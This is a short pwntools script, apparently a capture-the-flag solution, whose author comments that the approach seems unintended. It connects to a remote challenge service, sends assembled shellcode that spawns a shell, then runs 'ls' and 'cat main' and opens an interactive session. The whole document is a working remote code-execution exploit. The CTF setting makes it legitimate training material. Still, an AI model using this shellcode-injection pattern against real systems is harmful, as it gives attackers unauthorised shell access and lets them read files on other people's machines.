#感觉像是非预期
#Author: Mcpvioy
# -*- coding:utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
io = remote('01.linux.challenges.ctf.thefewchosen.com',53978)

io.recvline()
pl = shellcraft.sh()
io.sendline(asm(pl))
io.sendline('ls')
io.sendline('cat main')
io.interactive()
